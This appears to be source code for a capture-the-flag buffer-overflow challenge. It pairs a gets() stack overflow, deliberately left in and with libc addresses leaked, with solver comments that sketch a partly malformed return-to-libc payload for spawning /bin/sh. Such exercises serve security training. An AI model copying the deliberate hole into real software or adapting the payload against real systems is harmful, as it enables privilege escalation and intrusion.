#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128
//puts: 0xf7e3f290 ==> \x90\xf2\xe3\xf7
//fflush 0xf7e3d130
//read: 0xf7ec25d0
//write: 0xf7ec2670
//useful_string: 0x56557030 ==> \x30\x70\x55\56
//p system: 0xf7e13420 ==> \x20\x34\xe1\xf7 
//main: 0x00000803 ==> \x03\x08\x00\x00

//python2 -c ' print "A" * 160 + "p32(0xf7e13420)" + "\x03\x08\x00\x00" + "p32(0x56557030)"'


char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */


void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();

  
  return 0;
}
